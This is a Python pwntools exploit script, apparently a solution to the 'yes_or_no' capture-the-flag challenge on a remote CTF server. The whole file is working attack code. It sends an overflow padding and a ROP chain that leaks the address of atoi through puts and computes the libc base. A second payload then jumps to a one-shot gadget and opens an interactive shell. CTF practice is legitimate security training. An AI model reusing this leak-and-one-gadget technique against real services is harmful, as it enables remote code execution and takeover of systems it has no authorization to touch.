#!/usr/bin/python3

from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3009)
e = ELF("./yes_or_no")
libc = ELF("./libc-2.27.so")

#context.log_level = 'debug'

sla = lambda t, s: p.sendlineafter(t, s)    # sendlineafter
one = lambda i: oneshot[i] + libcBase       # choose oneshot gadget

pr = 0x00400883 # pop rdi; ret

padding = "A"*0x1a
oneshot = [0x4f2c5, 0x4f322, 0x10a38c]

sla("~!\n", "9830400")
sleep(0.1)

payload = padding.encode('utf-8')
payload += p64(pr)
payload += p64(e.got['atoi'])
payload += p64(e.plt['puts'])
payload += p64(pr + 1)
payload += p64(e.sym['main'])

sla("me\n", payload)
libcBase = u64(p.recvn(6).ljust(8, b"\x00")) - libc.sym['atoi']
log.info("library base address: " + hex(libcBase))

sla("~!\n", "9830400")
sleep(0.1)

payload = padding.encode('utf-8')
payload += p64(one(1))

sla("me\n", payload)
sleep(0.1)

p.interactive()
